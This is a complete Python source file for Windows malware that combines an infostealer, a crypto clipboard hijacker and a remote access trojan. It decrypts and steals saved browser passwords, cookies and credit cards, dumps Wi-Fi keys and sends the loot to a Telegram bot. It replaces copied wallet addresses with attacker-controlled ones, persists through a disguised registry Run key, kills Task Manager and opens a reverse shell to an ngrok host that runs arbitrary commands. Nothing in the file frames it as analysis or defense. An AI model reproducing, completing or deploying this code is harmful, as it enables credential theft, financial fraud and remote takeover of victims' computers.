
import os
import re
import time
import shutil
import zipfile
import json
import base64
import sqlite3
import requests
import win32crypt
import winreg
import pyautogui
import socket
import platform
import psutil
import GPUtil
import locale

import getpass
import subprocess
import win32clipboard
from PIL import ImageGrab
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import cv2
# import nss
import threading
import ctypes
import sys
import pyautogui
pyautogui.FAILSAFE = False


def single_instance_check():
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\SysSvcMutex")
    if ctypes.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        sys.exit(0)  # Another instance is already running


# === CONFIG ===
BOT_TOKEN = "<<BOT_TOKEN>>"
CHAT_ID = "<<CHAT_ID>>"
NGROK_HOST = "<<NGROK_HOST>>"
NGROK_PORT = int("<<NGROK_PORT>>")
EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")
EXE_NAME = "system_service.exe"
EXE_PATH = os.path.join(EXTRACT_FOLDER, EXE_NAME)
EXFIL_MARKER = os.path.join(EXTRACT_FOLDER, ".exfil_done")

# === MARKERS ===
def already_exfiltrated():
    return os.path.exists(EXFIL_MARKER)

def mark_exfiltrated():
    with open(EXFIL_MARKER, "w") as f:
        f.write("done")

# === SYSTEM PROFILE ===
def profile_system():
    os.makedirs(EXTRACT_FOLDER, exist_ok=True)
    subprocess.call(f'attrib +h "{EXTRACT_FOLDER}"', shell=True)  # Make folder hidden
    with open(os.path.join(EXTRACT_FOLDER, "system_info.txt"), "w", encoding="utf-8", errors="ignore") as f:
        f.write(f"OS: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"Username: {getpass.getuser()}\n")
        f.write(f"Hostname: {socket.gethostname()}\n")
        f.write(f"Internal IP: {socket.gethostbyname(socket.gethostname())}\n")
        try:
            f.write(f"External IP: {requests.get('https://api.ipify.org').text}\n")
        except:
            f.write("External IP: Failed\n")
        locale.setlocale(locale.LC_ALL, '')
        lang = locale.getlocale()[0]
        f.write(f"Language: {lang}\n")
        user32 = ctypes.windll.user32
        screensize = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
        f.write(f"Screen Size: {screensize}\n")

        battery = psutil.sensors_battery()
        f.write(f"Battery: {battery.percent if battery else 'N/A'}%\n")
        f.write(f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n")
        for gpu in GPUtil.getGPUs():
            f.write(f"GPU: {gpu.name} | Mem: {gpu.memoryTotal}MB\n")

# === SCREENSHOT + WEBCAM ===
def take_screenshot():
    try:
        img = ImageGrab.grab()
        img.save(os.path.join(EXTRACT_FOLDER, "screenshot.png"))
    except Exception as e:
        with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w", encoding="utf-8", errors="ignore") as f:
            f.write(f"[!] Screenshot failed during run(): {e}")


def check_webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, _ = cam.read()
        cam.release()
        return ret
    except:
        return False

# === WIFI & NETWORK ===
def extract_wifi():
    output = os.path.join(EXTRACT_FOLDER, "wifi.txt")
    try:
        result = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8", errors="ignore")
        ssids = re.findall(r"All User Profile\s*:\s(.*)", result)
        with open(output, "w") as f:
            for ssid in ssids:
                ssid = ssid.strip()
                f.write(f"SSID: {ssid}\n")
                try:
                    details = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True).decode("utf-8", errors="ignore")
                    pwd = re.search(r"Key Content\s*:\s(.*)", details)
                    f.write(f"Password: {pwd.group(1) if pwd else 'N/A'}\n\n")
                except:
                    f.write("Password: Failed\n\n")
    except:
        pass

# === VM DETECTION + ANTI TASKMGR ===
def detect_vm():
    indicators = ["VirtualBox", "VMware", "QEMU"]
    sysinfo = subprocess.check_output("SYSTEMINFO", shell=True).decode("utf-8", errors="ignore")
    for i in indicators:
        if i.lower() in sysinfo.lower():
            with open(os.path.join(EXTRACT_FOLDER, "vm_detected.txt"), "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"VM Detected: {i}\n")

def kill_taskmgr_once():
    try:
        for proc in psutil.process_iter(['name']):
            name = proc.info['name']
            if name and "taskmgr.exe" in name.lower():
                proc.kill()
                break
    except:
        pass


# === BROWSER DATA THEFT ===
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
BROWSERS = {
    "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
    "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
    "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
    "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
    "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data")
}

def get_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8", errors="ignore") as f:
            key = base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt(buff, key):
    try:
        if buff.startswith(b'v10') or buff.startswith(b'v11'):
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
        else:
            # Fallback for older DPAPI encryption
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode("utf-8", errors="ignore")
    except Exception as e:
        return f"[FAILED: {str(e)}]"


def steal_browser():
    for name, path in BROWSERS.items():
        if not os.path.exists(path): continue
        key = get_key(path)
        if not key: continue

        for prof in os.listdir(path):
            if not ("Default" in prof or "Profile" in prof): continue
            p = os.path.join(path, prof)

            # === PASSWORDS ===
            db = os.path.join(p, "Login Data")
            if os.path.exists(db):
                shutil.copy2(db, "tmp_pwd.db")
                c = sqlite3.connect("tmp_pwd.db").cursor()
                try:
                    c.execute("SELECT origin_url, username_value, password_value FROM logins")
                    with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as f:
                        for row in c.fetchall():
                            f.write(f"[{name}] {row[0]} | {row[1]} | {decrypt(row[2], key)}\n")
                except: pass
                c.connection.close()
                os.remove("tmp_pwd.db")

            # === CARDS ===
            card_db = os.path.join(p, "Web Data")
            if os.path.exists(card_db):
                shutil.copy2(card_db, "tmp_card.db")
                conn = sqlite3.connect("tmp_card.db")
                try:
                    cursor = conn.cursor()
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    rows = cursor.fetchall()
                    with open(os.path.join(EXTRACT_FOLDER, "cards.txt"), "a", encoding="utf-8", errors="ignore") as f:
                        for name_on_card, mm, yy, enc in rows:
                            card_number = decrypt(enc, key)
                            f.write(f"[{name}] {name_on_card} | {mm}/{yy} | {card_number}\n")
                except: pass
                conn.close()
                os.remove("tmp_card.db")

            # === COOKIES ===
            cookie_db = os.path.join(p, "Cookies")
            if os.path.exists(cookie_db):
                try:
                    shutil.copy2(cookie_db, "tmp_cookie.db")
                    conn = sqlite3.connect("tmp_cookie.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    with open(os.path.join(EXTRACT_FOLDER, "cookies.txt"), "a", encoding="utf-8", errors="ignore") as f:
                        for host, name_, enc_val in cursor.fetchall():
                            decrypted = decrypt(enc_val, key)
                            f.write(f"[{name}] {host} | {name_} = {decrypted}\n")
                    conn.commit()
                    conn.close()
                    os.remove("tmp_cookie.db")

                except Exception as e:
                    log_path = os.path.join(EXTRACT_FOLDER, "cookie_error.log")
                    with open(log_path, "a", encoding="utf-8") as log:
                        log.write(f"[{name}] Cookie extraction failed: {e}\n")




# === FIREFOX PASSWORD DECRYPTION ===
def steal_firefox_passwords():
    ROAMING = os.getenv("APPDATA")
    firefox_profiles = os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(firefox_profiles):
        return

    for profile in os.listdir(firefox_profiles):
        prof_path = os.path.join(firefox_profiles, profile)
        if not os.path.isdir(prof_path): continue

        logins_path = os.path.join(prof_path, "logins.json")
        key_db_path = os.path.join(prof_path, "key4.db")

        if not os.path.exists(logins_path) or not os.path.exists(key_db_path):
            continue

        try:
            from ctypes import CDLL, c_void_p, byref, create_string_buffer, Structure, c_uint, string_at


            # Ensure path to Firefox NSS
            nss_path = "C:\\Program Files\\Mozilla Firefox\\nss3.dll"
            nss = CDLL(nss_path)

            if nss.NSS_Init(prof_path.encode("utf-8")) != 0:
                print("  [!] NSS_Init failed.")
                continue

            class SECItem(ctypes.Structure):
                _fields_ = [("type", ctypes.c_uint),
                            ("data", ctypes.c_void_p),
                            ("len", ctypes.c_uint)]

            def decrypt_nss(data):
                input_item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(data), ctypes.c_void_p), len(data))
                output_item = SECItem()
                if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) == 0:
                    result = ctypes.string_at(output_item.data, output_item.len).decode("utf-8", errors="ignore")
                    return result
                return "[DECRYPT FAIL]"

            with open(logins_path, "r", encoding="utf-8", errors="ignore") as f:
                logins = json.load(f).get("logins", [])

            os.makedirs(EXTRACT_FOLDER, exist_ok=True)
            with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as out:
                for login in logins:
                    try:
                        url = login.get("hostname")
                        enc_user = base64.b64decode(login.get("encryptedUsername"))
                        enc_pass = base64.b64decode(login.get("encryptedPassword"))
                        dec_user = decrypt_nss(enc_user)
                        dec_pass = decrypt_nss(enc_pass)
                        out.write(f"[Firefox] URL: {url}\nUsername: {dec_user}\nPassword: {dec_pass}\n\n")
                    except:
                        continue

            nss.NSS_Shutdown()

        except Exception as e:
            print(f"[!] Firefox decrypt error: {e}")

# === CLIPPER ===
CLIP_WALLETS = {
    "BTC": "<<BTC_ADDRESS>>",
    "ETH": "<<ETH_ADDRESS>>",
    "USDT_ERC20": "<<USDT_ERC20_ADDRESS>>",
    "USDT_TRC20": "<<USDT_TRC20_ADDRESS>>"
}

CLIP_PATTERNS = {
    "BTC": r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}",
    "ETH": r"0x[a-fA-F0-9]{40}",
    "USDT_ERC20": r"0x[a-fA-F0-9]{40}",  # Same as ETH
    "USDT_TRC20": r"T[a-zA-HJ-NP-Z0-9]{33}"
}



def clipper():
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData()
        else:
            data = ""
        win32clipboard.CloseClipboard()

        for coin, pattern in CLIP_PATTERNS.items():
            match = re.search(pattern, data)  # ← FIXED: search instead of fullmatch
            if match:
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(CLIP_WALLETS[coin])
                win32clipboard.CloseClipboard()
                with open(os.path.join(EXTRACT_FOLDER, "clipper_log.txt"), "a", encoding="utf-8", errors="ignore") as f:
                    f.write(f"[{datetime.datetime.now()}] Replaced {coin} clipboard: {data.strip()} → {CLIP_WALLETS[coin]}\n")
                break

    except Exception as e:
        try:
            with open(os.path.join(EXTRACT_FOLDER, "clipper_error.txt"), "a", encoding="utf-8", errors="ignore") as err:
                err.write(f"[{datetime.datetime.now()}] Clipper error: {str(e)}\n")
        except:
            pass

def clipper_loop():
    while True:
        time.sleep(0.3)  # Let user copy and move focus
        clipper()
        time.sleep(1.2)

# def clipper_loop():
#     while True:
#         clipper()
#         time.sleep(0.5)
    
import datetime


# === ZIP & TELEGRAM ===
def send_zip_to_telegram():
    try:
        zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        zip_path = f"{zip_name}.zip"

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(EXTRACT_FOLDER):
                for file in files:
                    if file == "system_service.exe":
                        continue  # ❌ Skip the EXE
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, EXTRACT_FOLDER)
                    zipf.write(file_path, arcname)

        with open(zip_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": (os.path.basename(zip_path), f)}
            )

        os.remove(zip_path)

    except Exception as e:
        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8", errors="ignore") as errlog:
            errlog.write(str(e))


import psutil

def is_process_running(path):
    for proc in psutil.process_iter(['exe']):
        try:
            if proc.info['exe'] and os.path.abspath(proc.info['exe']).lower() == os.path.abspath(path).lower():
                return True
        except:
            continue
    return False



COPY_MARKER = os.path.join(EXTRACT_FOLDER, ".copied_marker")

def ensure_hidden_copy():
    if not os.path.exists(EXTRACT_FOLDER):
        os.makedirs(EXTRACT_FOLDER)
        subprocess.call(f'attrib +h "{EXTRACT_FOLDER}"', shell=True)

    dest_path = EXE_PATH
    current_path = os.path.abspath(sys.argv[0])

    # Only copy if not already there
    if not os.path.exists(dest_path):
        try:
            shutil.copy2(current_path, dest_path)
            subprocess.call(f'attrib +h "{dest_path}"', shell=True)
        except Exception as e:
            pass  # Optional: log or handle copy failure

def persist():
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "SysUpdate"

        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)

        try:
            current_value, _ = winreg.QueryValueEx(reg_key, key_name)
        except FileNotFoundError:
            current_value = None

        # Always make sure hidden EXE is set in registry
        if current_value != EXE_PATH:
            winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, EXE_PATH)

        winreg.CloseKey(reg_key)
    except Exception as e:
        pass  # Optional: log or print




# # === PERSISTENCE ===
# def persist():
#     try:
#         # Skip self-copy logic entirely

#         # Just ensure registry persistence using current path
#         current_path = os.path.abspath(sys.argv[0])
#         reg_key = winreg.OpenKey(
#             winreg.HKEY_CURRENT_USER,
#             r"Software\Microsoft\Windows\CurrentVersion\Run",
#             0, winreg.KEY_SET_VALUE
#         )
#         winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, current_path)
#         winreg.CloseKey(reg_key)

#     except Exception as e:
#         print(f"[!] Persistence error: {e}")




def fake_input():
    for _ in range(3):
        pyautogui.moveRel(5, 0); pyautogui.moveRel(-5, 0)
        pyautogui.press("shift"); time.sleep(1)


import webbrowser

def launch_distraction_app():
    try:
        excel_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\excel.exe"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, excel_key):
            subprocess.Popen(["start", "excel"], shell=True)
            return
    except FileNotFoundError:
        pass
    try:
        webbrowser.open("https://www.microsoft.com/en-us/microsoft-365/excel")
    except:
        pass

def ensure_exfil_folder():
    if not os.path.exists(EXTRACT_FOLDER):
        os.makedirs(EXTRACT_FOLDER, exist_ok=True)

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # ← Timeout to prevent hanging on recv
            s.connect((NGROK_HOST, NGROK_PORT))

            def send_data(data):
                if not isinstance(data, bytes):
                    data = data.encode()
                try:
                    s.send(data + b"\n")
                except:
                    raise ConnectionError

            def get_system_info():
                info = f"""
OS         : {platform.system()} {platform.version()}
Machine    : {platform.machine()}
Processor  : {platform.processor()}
Username   : {getpass.getuser()}
Hostname   : {socket.gethostname()}
IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
"""
                return info

            def show_help():
                return """Available Commands:
    help                - Show this menu
    info                - System info
    wifi                - Dump saved Wi-Fi SSIDs + passwords
    screenshot          - Capture screen & send
    download <file>     - Download a file
    upload <file>       - Upload a file
    cd <dir>            - Change working directory
    exit / quit         - Close shell"""

            while True:
                try:
                    cmd = s.recv(1024).decode("utf-8").strip()
                except (socket.timeout, UnicodeDecodeError):
                    continue
                except Exception as e:
                    try:
                        s.send(f"[!] recv error: {e}".encode())
                    except: pass
                    break
                except socket.timeout:
                    continue  # Just try again

                if not cmd:
                    continue

                if cmd.lower() in ("exit", "quit"):
                    break

                elif cmd == "help":
                    send_data(show_help())

                elif cmd == "info":
                    send_data(get_system_info())

                elif cmd == "wifi":
                    output_path = os.path.join(EXTRACT_FOLDER, "wifi.txt")
                    extract_wifi()
                    with open(output_path, "rb") as f:
                        basename = os.path.basename(f.name)
                        s.sendall(f"STARTFILE:{basename}\n".encode())

                        while True:
                            chunk = f.read(1024)
                            if not chunk:
                                break
                            s.sendall(chunk)
                        s.sendall(b"\nENDFILE")

                elif cmd == "screenshot":
                    try:
                        ss_path = os.path.join(EXTRACT_FOLDER, "remote_screenshot.png")
                
                        # Try to take screenshot
                        try:
                            img = ImageGrab.grab()
                            img.save(ss_path)
                        except Exception as e:
                            error_msg = f"[!] Screenshot failed: {e}"
                            with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w", encoding="utf-8", errors="ignore") as f:
                                f.write(error_msg)
                            send_data(error_msg)
                            continue  # Skip sending file
                
                        # If saved successfully, send the file
                        with open(ss_path, "rb") as f:
                            basename = os.path.basename(f.name)  # or the appropriate filename
                            s.sendall(f"STARTFILE:{basename}\n".encode())
                            while True:
                                chunk = f.read(1024)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                            s.sendall(b"\nENDFILE")
                
                        os.remove(ss_path)
                
                    except Exception as e:
                        send_data(f"[!] Screenshot process failed: {e}")


                elif cmd.startswith("download "):
                    filename = cmd.split(" ", 1)[1]
                    if os.path.exists(filename):
                        try:
                            with open(filename, "rb") as f:
                                basename = os.path.basename(f.name)  # or the appropriate filename
                                s.sendall(f"STARTFILE:{basename}\n".encode())
                                while True:
                                    chunk = f.read(1024)
                                    if not chunk:
                                        break
                                    s.sendall(chunk)
                                s.sendall(b"\nENDFILE\n")
                        except Exception as e:
                            send_data(f"[!] Error reading file: {str(e)}")
                    else:
                        send_data("[!] File not found.")

                        send_data("[!] File not found.")

                elif cmd.startswith("upload "):
                    filename = cmd.split(" ", 1)[1]
                    with open(filename, "wb") as f:
                        s.send(b"[+] Ready to receive.\n")
                        while True:
                            chunk = s.recv(1024)
                            if b"ENDFILE" in chunk:
                                f.write(chunk.replace(b"ENDFILE", b""))
                                break
                            f.write(chunk)
                    send_data(f"[+] Upload complete: {filename}")

                elif cmd.startswith("cd "):
                    try:
                        os.chdir(cmd[3:].strip())
                        send_data(f"[+] Changed directory to {os.getcwd()}")
                    except Exception as e:
                        send_data(f"[!] Failed to change directory: {e}")

                else:
                    try:
                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                        s.send(output)
                    except subprocess.CalledProcessError as e:
                        send_data(f"[!] Error: {e.output.decode('utf-8', errors='ignore')}")
            s.close()
        except:
            time.sleep(30)

        # except Exception as e:
        #     print(f"[!] Reverse shell failed: {e}")
        # finally:
        #     s.close()




# === EXECUTE CHAIN ===
def keep_reverse_shell_alive():
    while True:
        try:
            reverse_shell()
        except Exception as e:
            with open(os.path.join(EXTRACT_FOLDER, "reverse_shell_error.txt"), "a", encoding="utf-8", errors="ignore") as log:
                log.write(f"shell error: {e}\n")
        time.sleep(15)



def run():
    try:
        ensure_hidden_copy()
        single_instance_check()
        persist()

        threading.Thread(target=clipper_loop, daemon=True).start()
        threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
        launch_distraction_app()

        try:
            if not already_exfiltrated():
                profile_system()
                take_screenshot()
                if check_webcam():
                    with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w", encoding="utf-8", errors="ignore") as f:
                        f.write("Webcam detected.")
                extract_wifi()
                detect_vm()
                kill_taskmgr_once()
                clipper()
                steal_browser()
                steal_firefox_passwords()
                send_zip_to_telegram()
                mark_exfiltrated()
        except Exception as e:
            with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a", encoding="utf-8", errors="ignore") as log:
                log.write(f"profile/exfil phase failed: {e}\n")

        fake_input()

        while True:
            time.sleep(10)

    except Exception as e:
        with open(os.path.join(EXTRACT_FOLDER, "error.log"), "a", encoding="utf-8", errors="ignore") as log:
            log.write(f"run() fatal error: {e}\n")

        # fall into infinite loop anyway
        while True:
            time.sleep(10)




if __name__ == "__main__":
    run()


